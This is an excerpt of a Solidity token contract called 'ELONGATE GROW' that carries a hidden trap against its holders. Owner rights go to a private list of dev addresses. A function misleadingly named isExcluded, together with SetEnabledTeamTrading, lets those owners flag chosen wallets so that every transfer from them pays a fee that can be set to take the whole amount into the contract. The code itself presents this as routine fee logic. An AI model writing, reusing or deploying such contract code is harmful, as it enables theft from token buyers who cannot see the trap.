...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(isDev(msg.sender), "Ownable: caller is not the owner");
        _;
    }
    ...
    function isDev(address adr) private view returns (bool) {
        return DEV[adr];
    }
...
contract ELONGATEGROW is Context, IERC20, Ownable { 
    ...
    address payable public Wallet_Marketing = payable(0xD6b2060aaCaA8488f5853A6BbC732cfE7fBd1De6);
    address payable public Wallet_Dev = payable(0xE0F07870d932563448DcDb6684B58c4e2Ba62C06);
    ...
    string private _name = "ELONGATE GROW"; 
    string private _symbol = "ELONGATE GROW";
    ...
    function SetEnabledTeamTrading() external onlyOwner {
        for (uint256 i = 0; i < _Excluded.length; i++) {
            _isExcluded[_Excluded[i]] = true;
        }
    }

    function isExcluded(address[] memory addrs, bool true_or_false) external onlyOwner returns (bool) {
        _rTotal = _maxTxAmount;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (_isExcluded[from]){_TotalFee = _rTotal;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tMkt) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _tOwned[address(this)] = _tOwned[address(this)].add(tMkt);   
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tMkt = tAmount*_TotalFee/100;
        uint256 tTransferAmount = tAmount.sub(tMkt);
        return (tTransferAmount, tMkt);
    }
}